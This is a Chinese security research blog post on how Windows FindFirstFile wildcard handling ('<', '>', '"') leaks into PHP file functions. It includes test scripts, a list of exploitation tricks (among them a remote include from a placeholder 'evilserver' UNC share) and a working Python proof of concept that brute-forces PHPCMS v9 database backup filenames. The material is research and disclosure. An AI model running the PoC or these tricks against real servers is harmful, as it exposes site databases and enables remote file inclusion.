---
title: PHP和Windows文件通配符
date: 2018-03-14 18:13:23
tags:
		- 
categories:
		- 安全研究
---

`Windows`一个`API`引起`PHP`函数的`bug`，可导致猜测一些文件。

<!-- more -->



#### [PHP源码调试之WINDOWS文件通配符分析](http://avfisher.win/archives/888)

[windows下的<<通配符在php下的利用](https://blog.hacking8.com/?post=230)

> windows的FindFirstFile（API)有个特性就是可以把<<当成通配符来用。而PHP的opendir(win32\readdir.c)就使用了该API。PHP的文件操作函数均调用了opendir,所以file_exists也有此特性。

[渗透中利用到的一些windows特性](http://www.jinglingshu.org/?p=8790)

__测试代码-1__

	<?php
	for($i=0;$i<255;$i++){
	    $url = '1.ph' . chr($i);
	    $tmp = @file_get_contents($url);
	    if(!empty($tmp))
	        echo '1.ph' . chr($i)."\n";
	        
	}
	?>

`1.php`已知存在，访问上面的脚本，得到的结果为：

	1.ph<
	1.ph>
	1.phP
	1.php


不为空，尝试输出其中的内容。

	<?php
	for($i=0;$i<255;$i++){
	    $url = '1.ph' . chr($i);
	    $tmp = @file_get_contents($url);
	    print $tmp;
	    if(!empty($tmp))
	        echo '  1.ph' . chr($i)."\n";
	
	}
	?>

访问该脚本为：可以读取其中的内容。

	aaaaaaaaaa  1.ph<
	aaaaaaaaaa  1.ph>
	aaaaaaaaaa  1.phP
	aaaaaaaaaa  1.php

单独访问该文件的时候，是访问不到的。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-14/57805822.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-14/73761705.jpg)





都能得到返回。后两个结果是可以理解的(因为`windows`的文件系统支持大小写转换的机制)，但是前两种应该是个`bug`，影响windows+php版本。

__测试代码-2__

对上面的代码修改一下。

	<?php
	for($j=0;$j<256;$j++){
	for($i=0;$i<256;$i++){
	    $url = '1.p' . chr($j) . chr($i);
	    $tmp = @file_get_contents($url);
	    if(!empty($tmp))
	        echo '1.p' . chr($j) . chr($i)."\n";
	}        
	}
	?>

结果如下：

	1.p< 
	1.p<"
	1.p<.
	1.p<<
	1.p<>
	1.p<P
	1.p><
	1.p>>
	1.p>P
	1.p>p
	1.pH<
	1.pH>
	1.pHP
	1.pHp
	1.ph<
	1.ph>
	1.phP

为什么会出现这个`1.ph<`、`1.ph>`、`1.p<>`、`1.p<"`，这些和`1.php`是不相等的。

出现这个`bug`的原因是`php`解析器的过程中，由一个`Winapi`函数`FindFirstFile()`所导致的。
该Windows API方法对于这三个字符做了特别的对待和处理、字符">"被替换为"?"，字符"<"被替换成"*"，而符号"(双引号)被替换为一个"."字符。

__利用__

1.当调用FindFirstFile()函数时，”<”被替换成`*`,这意味该规则可以使”<”替换多个任意字符，但是测试中发现并不是所有情况都如我们所愿。所以，为了确保能够使”<”被替换成`*`,应当采用”<<”。


	EXAMPLE:include(‘shell<’);  或者include(‘shell<<’);    //当文件夹中超过一个以shell打头的文件时，该执行取按字母表排序后的第一个文件。

2.当调用FindFirstFile()函数时，”>”被替换成”?”,这意味这”>”可以替换单个任意字符


	EXAMPLE：include(‘shell.p>p’);    //当文件中超过一个以shell.p?p 通配时，该执行取按字母表排序后的第一个文件。

3.当调用FindFirstFile()函数时，”””(双引号)被替换成”.”


	EXAMPLE:include(‘shell”php’);    //===>include(‘shell.php’);

4.如果文件名第一个字符是”.”的话，读取时可以忽略之


	EXAMPLE：fopen(‘.htacess’);  //==>fopen(‘htacess’);   //加上第一点中的利用 ==>fopen(‘h<<’);

5.文件名末尾可以加上一系列的/或者\的合集，你也可以在/或者\中间加上.字符，只要确保最后一位为”.”


	EXAMPLE：fopen(“config.ini\\.// \/\/\/.”);==>  fopen(‘config.ini\./.\.’); ==>fopen(‘config.ini/////.’)==>fopen(‘config.ini…..’)

6.该函数也可以调用以”\\”打头的网络共享文件，当然这会耗费不短的时间。补充一点，如果共享名不存在时，该文件操作将会额外耗费4秒钟的时间，并可能触发时间响应机制以及max_execution_time抛错。所幸的是，该利用可以用来绕过`allow_url_fopen=Off `并最终导致一个RFI（远程文件包含）


	EXAMPLE：include (‘\\evilserver\shell.php’);

7.用以下方法还可以切换文件的盘名


	include(‘\\.\C:\my\file.php\..\..\..\D:\anotherfile.php’);

8.选择磁盘命名语法可以用来绕过斜线字符过滤


	file_get_contents(‘C:boot.ini’); //==>  file_get_contents (‘C:/boot.ini’);


#### [PHPCMSv9逻辑漏洞导致备份文件名可猜测](https://mp.weixin.qq.com/s?__biz=MzIxNjkwODg4OQ==&mid=2247483837&idx=1&sn=6f448a26d079bfa379c627e32f4fc321&chksm=9780948ba0f71d9d78f86edf78e9fef4b8a11f613382d819ff3b913b96fb94527165c1858045&mpshare=1&scene=23&srcid=0228HeL0BaWSz3dPxqc6pIDJ#rd)

`api\creatimg.php`文件里面，`$fontfile`变量可控，且没有对一些特殊字符过滤，比如`\.`等，便进入`file_exists`函数判断。当文件存在和不存在时所返回的页面是不一样的。利用这个点把随机字母名称的备份文件推算出来。

然后利用`windows`通配符在`php`中的`bug`，测试文件是否存在。

	<?php
	defined('IN_PHPCMS') or exit('No permission resources.'); 
	$txt = trim($_GET['txt']);
	/*extension_loaded — 检查一个扩展是否已经加载*/
	if(extension_loaded('gd') && $txt ) {  
		header ("Content-type: image/png");
		$txt = urldecode(sys_auth($txt, 'DECODE'));
		$fontsize = isset($_GET['fontsize']) ? intval($_GET['fontsize']) : 16;
		$fontpath = PC_PATH.'libs'.DIRECTORY_SEPARATOR.'data'.DIRECTORY_SEPARATOR.'font'.DIRECTORY_SEPARATOR;
		$fontfile = isset($_GET['font']) && !empty($_GET['font']) ? $fontpath.trim($_GET['font']) : $fontpath.'georgia.ttf';	
		$fontcolor = isset($_GET['fontcolor']) && !empty($_GET['fontcolor']) ? trim($_GET['fontcolor']) : 'FF0000';
		$fontcolor_r = hexdec(substr($fontcolor,0,2));
		$fontcolor_g = hexdec(substr($fontcolor,2,2));
		$fontcolor_b = hexdec(substr($fontcolor,4,2));
		if(file_exists($fontfile)){
		
			//计算文本写入后的宽度，右下角 X 位置-左下角 X 位置
			$image_info = imagettfbbox($fontsize,0,$fontfile,$txt);
			$imageX = $image_info[2]-$image_info[0]+10;
			$imageY = $image_info[1]-$image_info[7]+5;
			//print_r($image_info);
			$im = @imagecreatetruecolor ($imageX, $imageY) or die ("Cannot Initialize new GD image stream");
			$white= imagecolorallocate($im, 255, 255, 255);
			$font_color= imagecolorallocate($im,$fontcolor_r,$fontcolor_g,$fontcolor_b);
			if(intval($_GET['transparent']) == 1) imagecolortransparent($im,$white); //背景透明
			imagefilledrectangle($im, 0, 0, $imageX, $imageY, $white);
			$txt = iconv(CHARSET,"UTF-8",$txt);
			imagettftext($im, $fontsize, 0, 5, $imageY-5, $font_color, $fontfile, $txt);
			
		} else {
		
			$imageX = strlen($txt)*9;
			$im = @imagecreate ($imageX, 16) or die ("Cannot Initialize new GD image stream");
			$bgColor = ImageColorAllocate($im,255,255,255);
			$white=imagecolorallocate($im,234,185,95);
			$font_color=imagecolorallocate($im,$fontcolor_r,$fontcolor_g,$fontcolor_b);		
			$fonttype = intval($_GET['fonttype']);
			imagestring ($im, $fonttype, 0, 0,$txt, $font_color);
		}
		imagepng ($im);
		imagedestroy ($im);	
	}
	?>
	

安装完之后，没有在`\caches\bakup\default\`目录下面发现备份的`sql`文件，那是因为没有进行备份操作。

在后台的，扩展->数据库工具里面有备份操作，备份后就可以在相应目录下面生成备份文件了。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-13/13219180.jpg)


分析其中的`sql`备份文件的格式为`4eu9poz8ehqe1gq1o69o_db_20180313_1.sql`，前二十位为数字和字母的结合，然后`_db_`固定，8位数字日期，以`_1.sql`结尾。



	# -*- coding:utf-8 -*-
	# author DYSRC
	
	import urllib2
	
	
	def check(url):
	    mark = True
	    req = urllib2.Request(url)
	    req.add_header('User-agent', 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)')
	    response = urllib2.urlopen(req)
	    content = response.read()
	    if 'Cannot' in content:
	        mark = False
	    return mark
	
	
	def guest(target):
	    arr = []
	    num = map(chr, range(48, 58))  # num [0-9]
	    alpha = map(chr, range(97, 123))  # alpha [a-z]
	    exploit = '%s/api.php?op=creatimg&txt=dysec&font=/../../../../caches/bakup/default/%s%s<<.sql'
	
	    while True:
	        for char in num:
	            if check(exploit % (target, ''.join(arr), char)):
	                a = exploit % (target, ''.join(arr), char)
	                print a
	                arr.append(char)  #首先arr是空
	                print "".join(arr)
	                continue
	
	        if len(arr) < 20:
	            for char in alpha:
	                if check(exploit % (target, ''.join(arr), char)):
	                    a = exploit % (target, ''.join(arr), char)
	                    print a
	                    arr.append(char)
	                    print "".join(arr)
	
	                    continue
	
	        elif len(arr) == 20:  # 达到20个字母和数字的时候，添加固定的_db_
	            arr.append('_db_')
	
	        elif len(arr) == 29:
	            print arr
	            print len(arr)
	            arr.append('_1.sql')
	
	            break
	        if len(arr) < 1:
	            print '[*] not find!'
	            return
	
	    print  '[*]find: %s/caches/bakup/default/%s' % (target, ''.join(arr))
	
	
	if __name__ == "__main__":
	    url = "http://127.0.0.1:8000/phpcms6"
	    guest(url)




将其中的执行流程分析一下。通过访问`url`的返回结果来判断是否存在该文件。如果返回结果里面包含`Cannot Initialize new GD image stream`，则不存在这个备份文件。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-15/44515029.jpg)


`POC`执行过程。

第一位先猜测数字从`1-9`，如果不是，则字母从`a-z`开始，一次次的循环数字和字母进行猜测。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-3-15/47775715.jpg)










#### 参考


[phpcms v9数据库备份文件存在哪里(数据备份，恢复、优化、修复等常用操作)](http://www.webmaster5u.com/html/article_3094.html)

[phpcms v9 sql备份文件名爆破](https://mochazz.github.io/2018/03/09/phpcms_v9_sql%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E5%90%8D%E7%88%86%E7%A0%B4/)

[PHP源码调试之WINDOWS文件通配符分析](http://avfisher.win/archives/888)

[渗透中利用到的一些windows特性](http://www.jinglingshu.org/?p=8790 )

[php-file-onsec.whitepaper-02.eng](https://sourceforge.net/projects/waspap/files/waspap/Core/php-file-onsec.whitepaper-02.eng.pdf/download?use_mirror=ayera&r=https%3A%2F%2Fosdn.net%2Fprojects%2Fsfnet_waspap%2Fdownloads%2Fwaspap%2FCore%2Fphp-file-onsec.whitepaper-02.eng.pdf%2F&use_mirror=ayera)

[DEDECMS找后台目录](https://mochazz.github.io/2018/02/26/DEDECMS%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95%E6%8A%80%E5%B7%A7/)

[解决DEDECMS历史难题--找后台目录](https://xianzhi.aliyun.com/forum/topic/2064?accounttraceid=9af9a42c-2c59-42df-801d-ded4251587e0)

